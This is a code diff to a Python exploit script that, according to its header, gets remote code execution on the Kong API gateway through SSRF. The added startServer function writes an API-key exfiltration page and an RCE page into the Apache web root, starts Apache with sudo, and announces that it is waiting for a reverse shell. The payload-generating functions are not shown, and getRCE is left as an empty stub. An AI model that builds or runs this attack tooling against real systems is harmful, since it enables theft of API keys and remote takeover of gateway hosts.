@@ -7,6 +7,8 @@ Description: A remote code execution exploit that leverages SSRF on the Kong API
 import re
 import json
 import urllib.parse
+import os
+import subprocess
 
 def log(message):
     """
@@ -139,12 +141,38 @@ function createPlugin() {{
     return html_template
 
 
-def starServer(lport, lhost):
+def startServer(lhost, lport):
     """
     Starts apache server and moves HTML payload to server.
+    
+    Args:
+        lport (int): Local port for reverse shell connection
+        lhost (str): Local host IP address for callbacks and reverse shell
     """
-
-    pass
+    # Create directory if it doesn't exist
+    os.makedirs('/var/www/html', exist_ok=True)
+    
+    # Generate and save API key exfiltration HTML
+    keys_html = createAPIHTML(lhost)
+    with open('/var/www/html/keys.html', 'w') as f:
+        f.write(keys_html)
+    
+    # Generate and save RCE HTML
+    rce_html = formatRCEHTML(lhost, lport)
+    with open('/var/www/html/rce.html', 'w') as f:
+        f.write(rce_html)
+    
+    # Set appropriate permissions
+    subprocess.run(['sudo', 'chmod', '644', '/var/www/html/keys.html'])
+    subprocess.run(['sudo', 'chmod', '644', '/var/www/html/rce.html'])
+    
+    # Start Apache server
+    subprocess.run(['sudo', 'systemctl', 'start', 'apache2'])
+    
+    print(f"[+] Server started at http://{lhost}/")
+    print(f"[+] API key exfiltration payload available at: http://{lhost}/keys.html")
+    print(f"[+] RCE payload available at: http://{lhost}/rce.html")
+    print(f"[+] Listening for reverse shell on port {lport}")
 
 def createPlugin(url, lport, lhost):
     """
@@ -159,3 +187,5 @@ def getRCE(url):
     """
 
     pass
+
+startServer("127.0.0.1", 8888)
